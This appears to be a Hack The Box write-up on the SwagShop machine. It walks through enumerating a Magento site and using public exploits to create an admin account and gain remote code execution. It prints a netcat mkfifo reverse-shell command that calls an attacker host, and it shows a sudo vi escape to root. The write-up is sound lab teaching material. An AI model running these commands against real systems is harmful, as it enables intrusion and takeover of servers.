---
layout: single
title: Swagshop - Hack The Box
excerpt: "SwagShop is one of those easy boxes where you can pop a shell just by using public exploits. It's running a vulnerable Magento CMS on which we can create an admin using an exploit then use another one to get RCE. To privesc I can run vi as root through sudo and I use a builtin functionality of vi that allows users to execute commands from vi so I can get root shell."
date: 2019-09-28
classes: wide
header:
  teaser: /assets/images/htb-writeup-swagshop/swagshop_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - linux
  - magento
  - vi
  - sudo
---

![](/assets/images/htb-writeup-swagshop/swagshop_logo.png)

SwagShop is one of those easy boxes where you can pop a shell just by using public exploits. It's running a vulnerable Magento CMS on which we can create an admin using an exploit then use another one to get RCE. To privesc I can run vi as root through sudo and I use a builtin functionality of vi that allows users to execute commands from vi so I can get root shell.

## Summary

- A Vulnerable Magento CMS 1.9.0 instance is running and we can use a CVE to create an admin account
- We then use another exploit to get RCE and a shell on the box
- `vi` is in the sudoers file for www-data and we can execute a shell as root from withing `vi` with `:!/bin/sh`

## Tools/Blogs used

- Magento CE < 1.9.0.1 - (Authenticated) Remote Code Execution
- Magento eCommerce - Remote Code Execution

## Detailed steps

### Portscan

```
# nmap -sC -sV -p- 10.10.10.140
Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-11 20:52 EDT
Nmap scan report for swagshop.htb (10.10.10.140)
Host is up (0.011s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)
|   256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)
|_  256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Did not follow redirect to http://10.10.10.140/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Website enumeration

The website is running the Magento CMS:

![](/assets/images/htb-writeup-swagshop/webpage.png)

Gobuster finds the directories associated with Magento:

```
# gobuster -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 50 -u http://10.10.10.140
/app (Status: 301)
/downloader (Status: 301)
/errors (Status: 301)
/favicon.ico (Status: 200)
/includes (Status: 301)
/js (Status: 301)
/lib (Status: 301)
/media (Status: 301)
/pkginfo (Status: 301)
/server-status (Status: 403)
/shell (Status: 301)
/skin (Status: 301)
/var (Status: 301)
=====================================================
2019/05/11 20:57:10 Finished
=====================================================
```

Indexing is on for those directories:

![](/assets/images/htb-writeup-swagshop/indexing.png)

I have access to `/app/etc/local.xml` which contains the encrypted database password and the encryption key.

![](/assets/images/htb-writeup-swagshop/local.png)

I could not find any public tool to decrypt the password and because this is a 20 pts box there's probably some generic CVE exploit online that I can use.

### Getting a shell

A quick look with `searchsploit magento` shows the two interesting exploits:

- Magento CE < 1.9.0.1 - (Authenticated) Remote Code Execution
- Magento eCommerce - Remote Code Execution

The `Magento eCommerce - Remote Code Execution` exploit creates a new admin account with `forme/forme` as credentials. I just need to modify the target and the exploit and launch it to get an admin account:

```
# python 37997.py
WORKED
Check http://10.10.10.140/index.php/admin with creds form
```

I can now log in to the admin panel:

![](/assets/images/htb-writeup-swagshop/admin1.png)

![](/assets/images/htb-writeup-swagshop/admin2.png)

I'll use the other exploit `Magento CE < 1.9.0.1 - (Authenticated) Remote Code Execution` to gain remote code execution. I need to change the `username`, `password`, and `install_date` parameters. The `install_data` is in the `local.xml` I found earlier.

```
username = 'forme'
password = 'forme'
php_function = 'system'  # Note: we can only pass 1 argument to the function
install_date = 'Wed, 08 May 2019 07:23:09 +0000'  # This needs to be the exact date from /app/etc/local.xml
```

Launching exploit to spawn a reverse shell:

```
python 37811.py http://10.10.10.140/index.php/admin "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.23 9999 >/tmp/f"

# nc -lvnp 9999
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999
Ncat: Connection from 10.10.10.140.
Ncat: Connection from 10.10.10.140:44376.
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ cd /home
$ ls
haris
$ cat haris/user.txt
a44887...
```

### Privesc

The privesc is obvious: The `www-data` user can execute `vi` as root. I know I can spawn a shell from within `vi` with `:!/bin/sh` and it'll run as root because of sudo.

```
$ sudo -l
Matching Defaults entries for www-data on swagshop:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on swagshop:
    (root) NOPASSWD: /usr/bin/vi /var/www/html/*

$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@swagshop:/home$ sudo /usr/bin/vi /var/www/html/pwn -c ':!/bin/sh'

# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
c2b087...

   ___ ___
 /| |/|\| |\
/_| ´ |.` |_\           We are open! (Almost)
  |   |.  |
  |   |.  |         Join the beta HTB Swag Store!
  |___|.__|       https://hackthebox.store/password

                   PS: Use root flag as password!
#
```